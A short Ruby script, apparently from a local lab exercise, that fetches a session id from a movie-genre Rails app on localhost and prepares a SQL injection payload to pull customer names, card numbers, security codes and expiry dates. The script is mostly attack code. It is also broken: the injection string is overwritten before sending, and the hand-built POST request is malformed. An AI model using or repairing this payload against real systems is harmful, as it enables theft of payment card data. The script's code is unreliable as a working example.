require 'socket'
host = 'localhost'
port = 3000
path = "/movies/selectGenre" 

request = "GET #{path} HTTP/1.0\r\n\r\n"

socket = TCPSocket.open(host, port)
socket.print(request)
response = socket.read 

headers,body = response.split("\r\n\r\n", 2)
session_id = headers[/_session_id=(.*?);/] 
print session_id

request = ";select name, card_number, security_code, exp_month, exp_year from customers; "    

post_path = "/movies/showGenre HTTP/1.1\r\n" 
request_header = "POST #{post_path}\r\nAccept: text/xml,application/xml,application/xhtml+xml,text/html*/*\r\nAccept-Language: en-us\r\nAccept-Charset: iso-8859-1,*,utf-8\r\nContent-type: application/x-www-form-urlencoded\r\n\r\nCookie=#{session_id}\r\nContent-length:13\r\n\r\n"
request_form_data  = "utf8=%E2%9C%93&authenticity_token=xQnVLJChaH05g0qrPcLM7ob7d1KRH%2BzEJgh3XQQHKcs%3D&genre=All&commit=Show+Movies"

request = "#{request_header} #{request_form_data}" 
#print request

socket.print(request)
response = socket.read

#print response
socket.close
